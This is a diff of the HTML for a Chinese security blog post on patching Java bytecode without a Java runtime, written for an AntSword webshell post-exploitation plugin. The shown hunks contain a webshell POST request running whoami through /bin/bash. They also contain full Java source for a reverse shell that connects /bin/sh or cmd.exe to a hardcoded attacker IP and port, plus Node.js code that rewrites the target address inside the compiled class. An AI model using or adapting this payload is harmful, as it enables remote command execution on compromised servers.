@@ -10,13 +10,12 @@
     <title>无java环境修改字节码 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="无java环境修改字节码" />
 <meta property="og:description" content="1 前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/node-edit-java-class/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/node-edit-java-class/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-11-09T10:00:00+00:00" />
 <meta property="article:modified_time" content="2020-11-09T10:00:00+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="无java环境修改字节码"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="无java环境修改字节码"/>
 <meta name="twitter:description" content="1 前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -183,7 +182,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST:   ant=xxxxxxxxxxxxxxx&amp;var1=/bin/bash&amp;var2=whoami
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span><span class="p">:</span>   <span class="n">ant</span><span class="o">=</span><span class="n">xxxxxxxxxxxxxxx</span><span class="o">&amp;</span><span class="n">var1</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">var2</span><span class="o">=</span><span class="n">whoami</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。</p>
@@ -272,85 +271,85 @@
 </span><span class="lnt">79
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.*;
-</span></span><span class="line"><span class="cl">import java.net.Socket;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.*</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">Socket</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">public class ShellReverseTCP extends Thread {
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="n">ShellReverseTCP</span> <span class="k">extends</span> <span class="ne">Thread</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    InputStream zj;
-</span></span><span class="line"><span class="cl">    OutputStream sd;
-</span></span><span class="line"><span class="cl">    public static String ip;
-</span></span><span class="line"><span class="cl">    public static String port;
+</span></span><span class="line"><span class="cl">    <span class="n">InputStream</span> <span class="n">zj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">OutputStream</span> <span class="n">sd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="k">static</span> <span class="ne">String</span> <span class="n">ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="k">static</span> <span class="ne">String</span> <span class="n">port</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    ShellReverseTCP(InputStream zj, OutputStream sd) {
-</span></span><span class="line"><span class="cl">        this.zj = zj;
-</span></span><span class="line"><span class="cl">        this.sd = sd;
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">ShellReverseTCP</span><span class="p">(</span><span class="n">InputStream</span> <span class="n">zj</span><span class="p">,</span> <span class="n">OutputStream</span> <span class="n">sd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">zj</span> <span class="o">=</span> <span class="n">zj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">sd</span> <span class="o">=</span> <span class="n">sd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public ShellReverseTCP() {
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">ShellReverseTCP</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    @Override
-</span></span><span class="line"><span class="cl">    public boolean equals(Object obj){
-</span></span><span class="line"><span class="cl">        ip=&#34;targetIP&#34;;
-</span></span><span class="line"><span class="cl">        port=&#34;targetPORT&#34;;
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            RunShellReverseTCP();
-</span></span><span class="line"><span class="cl">            return true;
-</span></span><span class="line"><span class="cl">        }catch (Exception e){
-</span></span><span class="line"><span class="cl">            return false;
-</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">Override</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">boolean</span> <span class="n">equals</span><span class="p">(</span><span class="ne">Object</span> <span class="n">obj</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span><span class="o">=</span><span class="s2">&#34;targetIP&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">port</span><span class="o">=</span><span class="s2">&#34;targetPORT&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">RunShellReverseTCP</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public static void main(String[] args) {
-</span></span><span class="line"><span class="cl">        ip=&#34;192.168.88.129&#34;;
-</span></span><span class="line"><span class="cl">        port=&#34;9999&#34;;
-</span></span><span class="line"><span class="cl">        ShellReverseTCP shellReverseTCP = new ShellReverseTCP();
-</span></span><span class="line"><span class="cl">        shellReverseTCP.RunShellReverseTCP();
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="k">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="ne">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span><span class="o">=</span><span class="s2">&#34;192.168.88.129&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">port</span><span class="o">=</span><span class="s2">&#34;9999&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ShellReverseTCP</span> <span class="n">shellReverseTCP</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ShellReverseTCP</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shellReverseTCP</span><span class="o">.</span><span class="n">RunShellReverseTCP</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public void RunShellReverseTCP() {
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            String ShellPath;
-</span></span><span class="line"><span class="cl">            if (System.getProperty(&#34;os.name&#34;).toLowerCase().indexOf(&#34;windows&#34;) == -1) {
-</span></span><span class="line"><span class="cl">                ShellPath = new String(&#34;/bin/sh&#34;);
-</span></span><span class="line"><span class="cl">            } else {
-</span></span><span class="line"><span class="cl">                ShellPath = new String(&#34;cmd.exe&#34;);
-</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">RunShellReverseTCP</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">ShellPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">getProperty</span><span class="p">(</span><span class="s2">&#34;os.name&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toLowerCase</span><span class="p">()</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&#34;windows&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ShellPath</span> <span class="o">=</span> <span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ShellPath</span> <span class="o">=</span> <span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            Socket socket = new Socket(ip, Integer.parseInt(port));
-</span></span><span class="line"><span class="cl">            Process process = Runtime.getRuntime().exec(ShellPath);
-</span></span><span class="line"><span class="cl">            (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start();
-</span></span><span class="line"><span class="cl">            (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start();
-</span></span><span class="line"><span class="cl">        } catch (Exception e) {
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">            <span class="n">Socket</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Socket</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">Integer</span><span class="o">.</span><span class="n">parseInt</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">ShellPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">new</span> <span class="n">ShellReverseTCP</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">(),</span> <span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">()))</span><span class="o">.</span><span class="n">start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">new</span> <span class="n">ShellReverseTCP</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">(),</span> <span class="n">process</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">()))</span><span class="o">.</span><span class="n">start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    public void run() {
-</span></span><span class="line"><span class="cl">        BufferedReader yx = null;
-</span></span><span class="line"><span class="cl">        BufferedWriter jah = null;
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            yx = new BufferedReader(new InputStreamReader(this.zj));
-</span></span><span class="line"><span class="cl">            jah = new BufferedWriter(new OutputStreamWriter(this.sd));
-</span></span><span class="line"><span class="cl">            char buffer[] = new char[8192];
-</span></span><span class="line"><span class="cl">            int length;
-</span></span><span class="line"><span class="cl">            while ((length = yx.read(buffer, 0, buffer.length)) &gt; 0) {
-</span></span><span class="line"><span class="cl">                jah.write(buffer, 0, length);
-</span></span><span class="line"><span class="cl">                jah.flush();
-</span></span><span class="line"><span class="cl">            }
-</span></span><span class="line"><span class="cl">        } catch (Exception e) {
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        try {
-</span></span><span class="line"><span class="cl">            if (yx != null)
-</span></span><span class="line"><span class="cl">                yx.close();
-</span></span><span class="line"><span class="cl">            if (jah != null)
-</span></span><span class="line"><span class="cl">                jah.close();
-</span></span><span class="line"><span class="cl">        } catch (Exception e) {
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">run</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BufferedReader</span> <span class="n">yx</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BufferedWriter</span> <span class="n">jah</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">yx</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">InputStreamReader</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">zj</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">jah</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedWriter</span><span class="p">(</span><span class="n">new</span> <span class="n">OutputStreamWriter</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">sd</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">char</span> <span class="n">buffer</span><span class="p">[]</span> <span class="o">=</span> <span class="n">new</span> <span class="n">char</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">int</span> <span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">((</span><span class="n">length</span> <span class="o">=</span> <span class="n">yx</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="o">.</span><span class="n">length</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jah</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jah</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">yx</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">yx</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">jah</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jah</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。</p>
@@ -556,7 +555,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oldpos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="o">//</span><span class="err">判断字节码中是否包含目标字符串</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">let</span><span class="w"> </span><span class="n">newlength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">decimalToHex</span><span class="p">(</span><span class="n">newvar</span><span class="p">.</span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="o">//</span><span class="err">计算新字符串长度</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">let</span><span class="w"> </span><span class="n">retcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">`</span><span class="err">${</span><span class="n">hexcode</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">oldpos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="err">}${</span><span class="n">newlength</span><span class="err">}${</span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">newvar</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span><span class="err">}${</span><span class="n">hexcode</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="n">oldpos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hexoldvar</span><span class="p">.</span><span class="n">length</span><span class="p">)</span><span class="err">}</span><span class="o">`</span><span class="p">;</span><span class="o">//</span><span class="err">把原来字节码的前后部分截出来，中间拼上新的长度跟内容</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">retcode</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span><span class="o">//</span><span class="n">base64</span><span class="err">编码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="n">retcode</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span><span class="o">//</span><span class="n">base64编码</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s1">&#39;nonono&#39;</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">b64code</span><span class="p">;</span><span class="w">
@@ -566,7 +565,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">Number</span><span class="p">(</span><span class="n">d</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">padding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">typeof</span><span class="w"> </span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&#34;undefined&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">padding</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="no">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">padding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">padding</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">hex</span><span class="p">.</span><span class="n">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">padding</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;0&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hex</span><span class="p">;</span><span class="o">//</span><span class="err">小于</span><span class="n">padding</span><span class="err">长度就填充</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;0&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hex</span><span class="p">;</span><span class="o">//</span><span class="err">小于</span><span class="n">padding长度就填充0</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">hex</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">}</span><span class="w">
